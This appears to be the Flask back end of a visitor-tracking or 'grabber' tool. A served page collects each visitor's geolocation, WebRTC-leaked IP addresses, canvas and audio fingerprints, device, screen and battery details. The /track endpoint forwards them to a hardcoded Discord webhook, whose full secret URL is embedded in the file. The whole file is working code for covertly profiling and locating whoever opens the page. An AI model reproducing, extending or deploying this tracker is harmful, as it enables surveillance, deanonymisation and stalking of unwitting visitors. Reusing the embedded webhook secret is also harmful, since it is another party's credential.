from flask import Flask, request, jsonify, send_file
import json
import datetime
import os
import requests
from pathlib import Path

app = Flask(__name__)

# Your Discord webhook URL
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1536152829444493322/2l-TyMVUKD8Ly2wk-0amSwuTwUeXY_yOltEQT1MMH8OT-d8vzN8UsbAQ7aJK2iSzgy7o"

# Send data to Discord
def send_to_discord(data):
    """Send collected data to Discord webhook"""
    
    # --- DEBUG: Log the entire data object ---
    print("=" * 60)
    print("FULL DATA RECEIVED FOR DISCORD:")
    print(json.dumps(data, indent=2))
    print("=" * 60)
    
    # Check specifically for location
    location = data.get('location', {})
    print(f"LOCATION DATA: {location}")
    print(f"Location type: {type(location)}")
    print(f"Has latitude: {'latitude' in location}")
    print(f"Has longitude: {'longitude' in location}")
    
    # Format the data nicely for Discord
    embed = {
        "title": "📍 New Tracking Data Received",
        "color": 0x5865F2,
        "fields": [],
        "footer": {"text": f"Session: {data.get('sessionId', 'unknown')}"},
        "timestamp": datetime.datetime.utcnow().isoformat()
    }
    
    # --- FIXED: Better location extraction ---
    # Check if location exists and has coordinates
    if location and isinstance(location, dict):
        lat = location.get('latitude')
        lng = location.get('longitude')
        
        # Check if coordinates are valid (not None, not 'N/A')
        if lat is not None and lat != 'N/A' and lng is not None and lng != 'N/A':
            accuracy = location.get('accuracy', 'N/A')
            maps_link = f"https://maps.google.com/?q={lat},{lng}"
            
            embed["fields"].append({
                "name": "📍 Location",
                "value": f"**Lat/Lng:** {lat}, {lng}\n**Accuracy:** ±{accuracy}m\n[Google Maps]({maps_link})",
                "inline": False
            })
        else:
            # Check if there's an error message
            error = location.get('error', 'Unknown error')
            embed["fields"].append({
                "name": "📍 Location",
                "value": f"❌ Location not shared\nReason: {error}",
                "inline": False
            })
    else:
        embed["fields"].append({
            "name": "📍 Location",
            "value": "❌ No location data received",
            "inline": False
        })
    
    # Add browser info
    embed["fields"].append({
        "name": "🖥️ Browser Info",
        "value": f"**User Agent:** {data.get('userAgent', 'N/A')}\n**Platform:** {data.get('platform', 'N/A')}\n**Language:** {data.get('language', 'N/A')}",
        "inline": False
    })
    
    # Add screen info
    screen = data.get('screen', {})
    if screen:
        embed["fields"].append({
            "name": "📺 Screen",
            "value": f"**Resolution:** {screen.get('width', 'N/A')}x{screen.get('height', 'N/A')}\n**Color Depth:** {screen.get('colorDepth', 'N/A')}\n**Pixel Ratio:** {screen.get('pixelRatio', 'N/A')}",
            "inline": False
        })
    
    # Add WebRTC IP Leak
    webrtc = data.get('webRTCIPs', [])
    if webrtc and webrtc[0] != 'No local IPs found':
        embed["fields"].append({
            "name": "🔓 WebRTC IP Leak",
            "value": f"```{', '.join(webrtc)}```",
            "inline": False
        })
    
    # Add fingerprint
    embed["fields"].append({
        "name": "🆔 Fingerprint",
        "value": f"**Canvas:** {data.get('canvasFingerprint', 'N/A')}\n**Audio:** {data.get('audioFingerprint', 'N/A')}",
        "inline": False
    })
    
    # Add device info
    device_info = []
    if data.get('hardwareConcurrency'):
        device_info.append(f"CPU Cores: {data['hardwareConcurrency']}")
    if data.get('deviceMemory'):
        device_info.append(f"RAM: {data['deviceMemory']}GB")
    if data.get('touchPoints'):
        device_info.append(f"Touch Points: {data['touchPoints']}")
    
    if device_info:
        embed["fields"].append({
            "name": "📱 Device",
            "value": "\n".join(device_info),
            "inline": False
        })
    
    # Add battery info
    battery = data.get('battery', {})
    if battery:
        embed["fields"].append({
            "name": "🔋 Battery",
            "value": f"**Level:** {battery.get('level', 'N/A')}\n**Charging:** {battery.get('charging', 'N/A')}",
            "inline": False
        })
    
    # Send to Discord
    payload = {
        "content": "📊 **New visitor tracked!**",
        "embeds": [embed],
        "username": "CF Tracker Bot"
    }
    
    try:
        response = requests.post(DISCORD_WEBHOOK, json=payload)
        print(f"Discord response status: {response.status_code}")
        if response.status_code != 204:
            print(f"Discord response: {response.text}")
        return response.status_code == 204
    except Exception as e:
        print(f"Discord send error: {e}")
        return False

# Serve the main page
@app.route('/')
def serve_index():
    return send_file('../static/index.html')

# Receive tracking data
@app.route('/track', methods=['POST'])
def track_data():
    data = request.json
    
    # Log to console
    print(f"\n{'='*60}")
    print(f"TRACKING DATA RECEIVED - {datetime.datetime.now()}")
    print(f"{'='*60}")
    print(json.dumps(data, indent=2))
    print(f"{'='*60}\n")
    
    # Send to Discord
    discord_sent = send_to_discord(data)
    print(f"Discord webhook sent: {discord_sent}")
    
    return jsonify({
        "status": "success",
        "discord_sent": discord_sent
    })

# Health check
@app.route('/health')
def health():
    return jsonify({"status": "healthy"})

app = app
